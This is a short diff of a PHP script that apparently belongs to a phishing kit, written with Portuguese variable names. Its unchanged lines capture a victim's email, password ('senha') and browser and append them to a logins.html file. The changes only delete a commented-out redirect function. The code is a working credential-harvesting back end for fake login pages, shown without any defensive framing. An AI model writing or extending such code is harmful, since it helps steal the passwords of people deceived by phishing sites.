@@ -11,24 +11,6 @@ $ess ="Email: ".$email."<br>Senha: ".$senha."<br>Navegador: ".$browser."
 $abre =@fopen("logins.html","a+");
 $escreve =fwrite($abre, $ess);
 	
-
-    
-// function redirecionar($url, $tempo) 
-// { 
-//     $url = str_replace('&amp;', '&', $url); 
-         
-//     if($tempo > 0) 
-//     { 
-//         header("Refresh: $tempo; URL=$url"); 
-//     } 
-//     else 
-//     { 
-//         @ob_flush();
-//         @ob_end_clean();
-//         header("Location: $url"); 
-//         exit; 
-//     } 
-// } 
 ?>
 
 
